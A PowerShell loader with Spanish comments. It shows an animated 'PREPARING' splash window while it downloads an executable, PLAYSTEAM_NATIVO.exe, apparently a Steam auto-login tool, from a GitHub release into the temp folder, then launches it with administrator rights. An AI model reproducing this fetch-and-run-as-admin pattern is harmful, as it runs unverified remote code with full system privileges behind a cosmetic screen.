[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 1. XAML con Animaciones (Storyboards)
$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Height="500" Width="800" WindowStyle="None" AllowsTransparency="True" Background="Transparent" WindowStartupLocation="CenterScreen">
    <Window.Resources>
        <Storyboard x:Key="Spin" RepeatBehavior="Forever">
            <DoubleAnimation Storyboard.TargetName="Ring" Storyboard.TargetProperty="(UIElement.RenderTransform).(RotateTransform.Angle)" From="0" To="360" Duration="0:0:1.5" />
            <DoubleAnimation Storyboard.TargetName="Core" Storyboard.TargetProperty="Opacity" From="0.4" To="1" Duration="0:0:1" AutoReverse="True" />
        </Storyboard>
    </Window.Resources>
    <Window.Triggers>
        <EventTrigger RoutedEvent="Window.Loaded">
            <BeginStoryboard Storyboard="{StaticResource Spin}" />
        </EventTrigger>
    </Window.Triggers>
    <Border Background="Black" CornerRadius="10">
        <Grid>
            <!-- Anillo Giratorio -->
            <Ellipse x:Name="Ring" Width="90" Height="90" Stroke="#ff4500" StrokeThickness="4" StrokeDashArray="3 1" RenderTransformOrigin="0.5,0.5">
                <Ellipse.RenderTransform>
                    <RotateTransform Angle="0" />
                </Ellipse.RenderTransform>
                <Ellipse.Effect>
                    <DropShadowEffect Color="#ff0000" BlurRadius="15" ShadowDepth="0" />
                </Ellipse.Effect>
            </Ellipse>
            <!-- Núcleo Brillante -->
            <Ellipse x:Name="Core" Width="40" Height="40" Fill="#ffaa00">
                <Ellipse.Effect>
                    <DropShadowEffect Color="#ffaa00" BlurRadius="20" ShadowDepth="0" />
                </Ellipse.Effect>
            </Ellipse>
            <TextBlock Text="P R E P A R I N G . . ." Foreground="#ffaa00" FontSize="18" FontWeight="ExtraBold" Margin="0,150,0,0" HorizontalAlignment="Center" VerticalAlignment="Center">
                <TextBlock.Effect>
                    <DropShadowEffect Color="#ff4500" BlurRadius="10" ShadowDepth="0" />
                </TextBlock.Effect>
            </TextBlock>
        </Grid>
    </Border>
</Window>
"@

# 2. Iniciar la ventana de carga en un Hilo Separado
$runspace = [runspacefactory]::CreateRunspace()
$runspace.ApartmentState = "STA"
$runspace.Open()
$ps = [powershell]::Create().AddScript({
    Add-Type -AssemblyName PresentationFramework
    $window = [Windows.Markup.XamlReader]::Load((New-Object System.Xml.XmlNodeReader([xml]$args[0])))
    $window.ShowDialog()
}).AddArgument($xaml)
$ps.Runspace = $runspace
$handle = $ps.BeginInvoke()

# 3. Iniciar la Descarga de la app en el hilo principal
$p = "$env:temp\PLAYSTEAM_NATIVO.exe"
(New-Object Net.WebClient).DownloadFile('https://github.com/Rober324/PLAYSTEAM_AUTOLOGIN/releases/latest/download/PLAYSTEAM_NATIVO.exe', $p)

# 4. Limpiar la ventana de carga y Ejecutar como Administrador
$ps.Stop()
$ps.Dispose()
$runspace.Close()
$runspace.Dispose()

Start-Process $p -Verb RunAs
exit
